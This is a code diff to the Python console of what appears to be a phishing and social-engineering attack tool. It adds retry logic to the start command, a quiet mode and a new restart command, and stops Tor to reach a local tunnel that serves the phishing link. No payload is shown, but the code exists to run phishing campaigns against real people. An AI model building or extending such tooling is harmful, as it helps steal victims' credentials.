@@ -381,19 +381,23 @@ class Console(Cmd, object):
   call('clear')
   print banner()
 
- def do_start_phish(self, args):
+ def do_start_phish(self, args=None, rec=2):
   '''\n\tDescription: Start a phishing attack
     \tUsage: start_phish\n'''
   try:
    if self.phishing_obj:return
-   print '\n\t[+] Starting social engineering attack ...\n'
-   self.exit(False) # stop tor so we can access http://127.0.0.1:4040 for url
+   if not args:print '\n\t[+] Starting social engineering attack ...\n'
+   self.exit(False) # stop tor so we can access http://localhost:4040 for url
    self.phishing_obj = Phish()
    link = self.phishing_obj.start()
-   if not link:
+   if all([not link, not rec]):
     self.phishing_obj.stop()
     self.phishing_obj = None
     print '\n\t[!] Error: Phishing attack failed, try again in a while!\n'
+   elif all([not link, rec]):
+    self.phishing_obj.stop()
+    self.phishing_obj = None
+    self.do_start_phish(True, rec=rec-1)
    else:
     prompt = '{}{}{}>{} '.\
     format(colors['red'], getuser(), colors['blue'], colors['white'])
@@ -402,18 +406,27 @@ class Console(Cmd, object):
   except:pass
   finally:self.do_start([str(_) for _ in range(self._sessions.qsize())], False)
 
- def do_stop_phish(self, args):
+ def do_stop_phish(self, args=None):
   '''\n\tDescription: Stop phishing attack
     \tUsage: stop_phish\n'''
   try:
    if not self.phishing_obj:return 
-   print '\n\t[!] Stopping social engineering attack ...\n'
+   if not args:print '\n\t[!] Stopping social engineering attack ...\n'
    self.phishing_obj.stop()
    self.phishing_obj = None
   except:pass 
   finally:
    self.prompt = '{}{}{}>{} '.\
   format(colors['red'], getuser(), colors['blue'], colors['white'])
+
+ def do_restart_phish(self, args):
+  '''\n\tDescription: Restart phishing attack
+    \tUsage: restart_phish\n'''
+  if self.phishing_obj:
+   print '\n\t[+] Restarting social engineering attack ...\n'
+   self.do_stop_phish(True)
+  else:print '\n\t[+] Starting social engineering attack ...\n'
+  self.do_start_phish(True)
 
  def do_capture_list(self, args):
   '''\n\tDescription: Display the capture list
